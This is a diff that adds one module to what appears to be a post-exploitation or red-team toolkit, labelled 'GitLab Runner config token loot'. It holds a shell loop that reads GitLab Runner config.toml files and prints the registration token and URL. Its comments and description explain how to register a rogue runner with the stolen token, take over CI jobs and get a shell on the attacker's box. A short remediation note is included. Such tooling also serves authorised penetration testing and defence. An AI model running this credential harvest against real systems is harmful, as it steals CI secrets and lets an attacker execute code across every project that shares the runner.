@@ -1,0 +1,41 @@
+technique: T1552.001
+name: GitLab Runner config token loot
+key: loot:gitlab-runner
+tactic: [credential-access]
+platform: [linux]
+ranking:
+  exploitability: medium
+  safety: read-only
+  detection: quiet
+detect:
+  always: true
+execute:
+  command: |-
+    # /etc/gitlab-runner/config.toml holds the runner registration
+    # token; the token lets us register our own runner against the
+    # same GitLab instance and claim jobs — code execution as the
+    # pipeline user on every project that runner is shared with.
+    for f in /etc/gitlab-runner/config.toml \
+             $HOME/.gitlab-runner/config.toml; do
+      if [ -r "$f" ]; then
+        echo "=== $f ==="
+        grep -E '(token|url) *=' "$f"
+      fi
+    done
+verify:
+  success: "token"
+cleanup:
+  command: ""
+report:
+  vector_type: gitlab_runner_loot
+  evidence: "readable /etc/gitlab-runner/config.toml with token"
+  description: >
+    GitLab's runner config holds the registration token + GitLab URL.
+    An operator who reads both registers a NEW runner on the same
+    GitLab instance and tags it like the compromised one — the
+    scheduler pins jobs to our runner, and every CI job becomes a
+    shell on the attacker's box.
+  remediation: >
+    config.toml should be 0600 root:root. Rotate the runner token after
+    any suspected compromise (``gitlab-runner reset-token``).
+  refs: [T1552.001]
